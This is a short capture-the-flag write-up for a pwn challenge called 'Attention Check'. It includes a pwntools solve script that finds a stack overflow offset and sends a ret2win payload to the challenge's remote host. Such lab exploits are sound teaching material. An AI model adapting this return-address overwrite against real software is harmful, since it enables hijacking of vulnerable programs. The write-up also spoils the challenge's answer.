# Attention Check

The solution to this is to write a ret2win program
to call the `backdoor` function. It was included
in the pwn workshop, and participants can refer
to that script and modify the parts where needed.

The harder part was to decompile the binary, but it
should be simple enough to realise that its almost
identical to the `buf-overflow.c` file in the pwn workshop.

## Solve Script

```py
from pwn import *

elf = ELF("./attention-check")

p = process("./attention-check")
p.recvuntil(b'> ')
p.sendline(cyclic(100, n=8))
p.wait()

core = p.corefile
offset = cyclic_find(core.read(core.rsp, 8), n=8)

print("[+] Found offset:", offset)

# p = process("./attention-check")
p = remote("challs.ycep24.nullsecsig.com", 9116)
p.recvuntil(b"> ")

payload = b"A" * offset
payload += p64(elf.sym["backdoor"])

p.clean()
p.sendline(payload)
p.interactive()
```
